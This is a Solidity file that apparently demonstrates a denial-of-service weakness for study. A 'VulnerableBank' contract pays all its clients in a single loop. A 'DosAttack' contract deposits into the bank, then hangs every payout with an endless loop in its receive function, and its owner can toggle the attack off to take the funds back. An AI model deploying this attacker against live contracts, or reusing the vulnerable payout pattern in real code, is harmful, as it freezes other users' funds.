// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

contract VulnerableBank {
    mapping(address => uint) public balances;
    address[] public allClients;
    uint public withdrawProgress = 0;

    function deposit() public payable { 
       if (balances[msg.sender] == 0) {
         allClients.push(msg.sender); // Додаємо адресу лише якщо це перший депозит
        }
     balances[msg.sender] += msg.value;

    }

    function withdraw() external {
       for (uint i = withdrawProgress; i < allClients.length; i++) {
            address clientAddress = allClients[i];

            uint balanceToWithdraw = balances[clientAddress];
            require(balanceToWithdraw > 0, "No funds to withdraw");

            (bool success, ) = clientAddress.call{value: balanceToWithdraw}("");

            if (success) {
                balances[clientAddress] = 0;
            }
            withdrawProgress++;
        }
    }

    function currentBalance() public view returns(uint) {
        return address(this).balance;
    }

    function getAllClientsLength() public view returns (uint) {
    return allClients.length;
}
}

contract DosAttack {
    VulnerableBank public bank;
    bool hack = true;
    address owner;

    constructor(address bank_contract) {
        bank = VulnerableBank(bank_contract);
        owner = msg.sender;
    }

    function doDepositToBank() external payable {
        bank.deposit{value: msg.value}();
    }

    function toggleHack() external {
        require(msg.sender == owner, "you are not owner");
        hack = !hack;
    }

    receive() external payable {
        if(hack == true) {
            while(true) {}
        } else {
            payable(owner).transfer(address(this).balance);
        }
    }

     function currentBalance() public view returns(uint) {
        return address(this).balance;
    }
}